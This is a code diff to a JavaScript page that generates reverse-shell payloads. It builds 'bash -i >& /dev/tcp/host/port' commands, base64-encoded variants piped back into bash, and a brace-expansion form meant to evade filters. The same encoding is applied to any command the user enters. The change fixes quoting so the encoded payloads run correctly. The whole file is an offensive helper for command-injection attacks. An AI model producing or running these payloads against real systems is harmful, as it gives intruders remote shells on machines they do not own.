@@ -26,8 +26,8 @@ function getresult(){
     var bash2 = "bash -i >& /dev/tcp/" + host + "/" +port + " 0>&1"
     var bash5 = 'echo ' + btoa(bash1) + '|base64 -d|bash -i';
     var bash6 = 'echo ' + btoa(bash2) + '|base64 -d|bash -i';
-	var bash3 = 'bash -c {echo,' + btoa(bash1) + '}|{base64,-d}|{bash,-i}';
-    var bash4 = 'bash -c {echo,' + btoa(bash2) + '}|{base64,-d}|{bash,-i}';
+	var bash3 = 'bash -c "{echo,' + btoa(bash1) + '}|{base64,-d}|{bash,-i}"';
+    var bash4 = 'bash -c "{echo,' + btoa(bash2) + '}|{base64,-d}|{bash,-i}"';
 	var htmlContent = bash1 + "</br>" + bash2 + "</br>" +bash5+"</br>" +bash6+"</br>" +bash4 + "</br>" +  bash3 + "</br>";
 	result.innerHTML = htmlContent;
 }
@@ -36,7 +36,7 @@ function getresult1(){
 	var cmd = document.getElementById('cmd').value;
 	var result = document.getElementById('result1');
     var bash1 = 'echo ' + btoa(cmd) + '|base64 -d|bash -i';
-	var bash2 = 'bash -c {echo,' + btoa(cmd) + '}|{base64,-d}|{bash,-i}';
+	var bash2 = 'bash -c "{echo,' + btoa(cmd) + '}|{base64,-d}|{bash,-i}"';
 	var htmlContent = bash1 + "</br>" + bash2 + "</br>";
 	result.innerHTML = htmlContent;
 }
